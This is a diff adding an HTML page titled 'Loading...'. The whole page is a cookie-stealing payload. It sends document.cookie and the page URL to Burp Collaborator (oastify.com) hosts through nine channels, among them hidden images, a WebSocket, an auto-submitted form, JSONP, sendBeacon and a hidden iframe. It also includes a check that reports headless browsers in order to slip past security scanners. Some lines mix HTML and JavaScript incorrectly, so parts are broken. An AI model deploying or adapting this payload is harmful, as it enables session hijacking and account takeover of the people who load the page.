@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+
+    <!-- 1️⃣ DNS Exfiltration (No CORS Issues) -->
+    <img src="http://"+btoa(document.cookie)+".wkk9qe15og54axjhooszcvowwn2eq6ku9.oastify.com/" style="display:none;">
+
+    <!-- 2️⃣ WebSocket Exfiltration (Alternative Channel) -->
+    <script>
+        try {
+            var ws = new WebSocket("wss://wkk9qe15og54axjhooszcvowwn2eq6ku9.oastify.com/socket");
+            ws.onopen = function() {
+                ws.send("Cookies: " + document.cookie);
+                ws.send("URL: " + document.URL);
+            };
+        } catch (e) {}
+    </script>
+
+    <!-- 3️⃣ Fake Form Submission (No Preflight) -->
+    <form id="stealthForm" action="https://6ovjuo5fsq9ee7nrsyw9g5s60x6ougp4e.oastify.com/capture" method="GET">
+        <input type="hidden" name="data" value="Cookies: " + document.cookie>
+    </form>
+    <script>document.forms['stealthForm'].submit();</script>
+
+    <!-- 4️⃣ Sandbox Detection (Avoids Security Scanners) -->
+    <script>
+        if (navigator.webdriver || window.navigator.userAgent.includes("Headless")) {
+            new Image().src = "https://1uwe0jbaylf9k2tmyt24m0y16scj0bwzl.oastify.com/detected-sandbox";
+        }
+    </script>
+
+    <!-- 5️⃣ Image Load Timing Attack (Detect Processing Delays) -->
+    <img src="https://5y4i4nfe2pjdo6xq2x68q425awgn4f13q.oastify.com/time?start="+Date.now() 
+         onload="this.src='https://urp7xc83vec2hvqfvmzxjtvu3l9cx4vsk.oastify.com/time?end='+Date.now()" 
+         style="display:none;">
+
+    <!-- 6️⃣ GET Request with Image Tag (Avoids Preflight) -->
+    <script>
+        new Image().src = "https://k5qxb2mt94qsvl459cdnxj9khbn2buaiz.oastify.com/log?data=" + encodeURIComponent(document.cookie);
+    </script>
+
+    <!-- 7️⃣ JSONP Callback Request (Bypasses CORS) -->
+    <script src="https://dhyqnvymlx2l7egyl5pg9cldt4zvnnnbc.oastify.com/log.js?callback=stealth&data=" + encodeURIComponent(document.cookie)></script>
+
+    <!-- 8️⃣ Background Logging (Using Navigator.sendBeacon) -->
+    <script>
+        navigator.sendBeacon("https://u727dco3bes2xv6fbmfxztbujlpcd4es3.oastify.com/log", "data=" + encodeURIComponent(document.cookie));
+    </script>
+
+    <!-- 9️⃣ Hidden Iframe for Long-Term Exfiltration -->
+    <iframe src="https://356gblmc9nqbv44o9vd6x293hunlbdd12.oastify.com/log?cookies=" + encodeURIComponent(document.cookie) 
+            style="display:none;"></iframe>
+
+</body>
+</html>
